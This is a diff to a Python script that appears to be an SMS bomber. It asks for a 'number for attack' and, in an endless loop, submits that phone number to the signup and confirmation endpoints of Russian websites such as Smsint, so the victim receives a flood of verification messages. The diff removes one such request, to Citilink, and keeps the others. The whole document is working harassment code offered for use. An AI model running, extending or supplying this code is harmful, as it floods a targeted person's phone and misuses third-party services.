@@ -19,7 +19,6 @@ banner = """
 print(banner)
 _phone = input('Hello! Number for attack (79xxxxxxxxx)-->> ')
 
-
 _name = ''
 for x in range(12):
 	_name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
@@ -97,11 +96,6 @@ while True:
 	except:
 		print('[-] Не отправлено!')
 
-	try:
-		requests.post('https://www.citilink.ru/registration/confirm/phone/+'+_phone+'/')
-		print('[+] Citilink отправлено!')
-        except:
-		print('[-] Не отправлено!')
 	try:
 		requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name': _name,'phone': _phone, 'promo': 'yellowforma'})
 		print('[+] Smsint отправлено!')
